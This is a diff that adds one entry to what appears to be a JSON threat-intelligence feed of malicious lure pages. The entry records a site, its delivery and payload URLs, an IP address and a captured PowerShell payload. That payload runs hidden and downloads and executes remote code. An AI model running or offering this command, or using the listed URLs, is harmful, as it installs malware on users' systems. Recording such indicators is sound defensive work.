@@ -1030,5 +1030,22 @@
     ],
     "ReportId": "cmwwqyouc07dh0omlolqmo2dw",
     "ScannedAt": "2026-11-25T23:20:50.781000+00:00"
+  },
+  {
+    "UrlDomain": "www.slusaria.pl",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/27df94cce9da1af5"
+    ],
+    "IP": [
+      "116.202.130.125"
+    ],
+    "Related": [],
+    "Payload": "powershell -w h \"iex(irm \\'fingerprint-veri[.]info/d8fc26fb3c8ae49a\\'); Start-Sleep -Seconds 30\"; exit",
+    "ResolvedDownloadUrl": [],
+    "ReportId": "cmwwrflwh07q50omlekf5zm7a",
+    "ScannedAt": "2026-11-25T23:34:00.107000+00:00"
   }
 ]
